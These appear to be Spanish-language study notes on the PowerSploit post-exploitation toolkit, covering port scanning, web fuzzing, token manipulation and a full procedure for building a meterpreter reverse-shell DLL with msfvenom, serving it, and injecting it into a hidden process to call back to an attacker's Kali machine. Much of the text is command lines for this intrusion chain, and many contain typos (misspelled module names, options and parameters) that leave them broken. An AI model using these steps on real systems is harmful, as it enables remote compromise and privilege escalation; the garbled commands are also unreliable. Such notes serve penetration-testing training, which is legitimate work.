. https://github.com/PowerShellMafia/PowerSploit
- https://resources.infosecinstitute.com/topic/powershell-toolkit-powersploit/#gref
- https://github.com/mattifestation/PowerShellArsenal
##################################################################################################################

--- Import-Module.\PowerSploit-master\Powersploit.psml
--- Get-Help Invoke-Portscan
--- Invoke-Portscan -Hosts maquinaremota
$RESULTADO Invoke-Portscan -Hosts dc.adatum.com
$RESULTADO|Select-object -ExpandProperty openPorts
--- Get-Command -Module powerSloit (o usar Show-command y buscarlo)
--- Get-HttpStatus -Target maquinaremota -Path .\PowerSploit-master\Recon\Dictionaries\generic.txt
(where-object(s.Status -match"ok"} busca)

###################################################################################################################

conjunto de herramientas que permiten ejecutar tareas, sobretodo en pos explotacion. tiene dos ramas

- clasica: Mas orientada a post explotacion (ejecucion de codigo, modificar script, persistencia,bypass antivirus, mimicat, modificar sector de arranque, recon reconocimiento y escaneo de puertos) 
- PowerSloit Arsenal: centrado en ingenieria inversa (desensamblado, analisis de malware, herramientas para trabajar con la memoria, parsers,analisis de Sistema operativo)

ejemplos:
- Invoke-Portscan -Hosts maquinacontrolador de dominio -ports 20-600
--Fuzzing busca carpeta/directorio/archivo ocultos para mostrar posibles vectores de ataque
(hacer escaneos de servidores web)
(fuzzing list: https://github.com/maverickNerd/wordlists)
- Get-HttpStatus -Target ip -Path ./fuzzing-worlist.txt
(localiza todas esas carpetas y archivos ocultos en el servicio)


(inyectar una dll maliciosa dentro de un proceso)
- Invoke-DLLInjection
(en kali)(crear una DLL maliciosa)
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=445 - dll > powersploit.dll (guarda en un archivo llamado asi)
- python -m SimpleHTTPServer (para pasar el archivo a windows)
- (en Kali) 
- msfsploit
- use sploit/multi/handler
- set PLYLOAD windows/x64/meterpreter/reverse_tcp 
- LHOST=ip 
- LPORT=445
- sploit
(en windows)
- start-Process notepad.exe -windowsStyle hidden (proceso oculto)
- invoke-DLLInjection -processID idproceso -Dll ./powerSploit.dll
(se conectara con kali mediante meterpreter gracias al dll malicioso)



(mostrar los tokens que hay en la maquina)
-invoke-tokenManipulation -Enumerate
(lanzar un proceso con cualquier usuario)
- invoke-tokenManipulation -createProcess "calc.exe" -username "NT/autority/system"
- $proceso=Get-CimInstance Win32_process -Filtrer "name=win32Calc.exe"
- invoke-CimMethod -ImputObject $proceso -metodName getowner

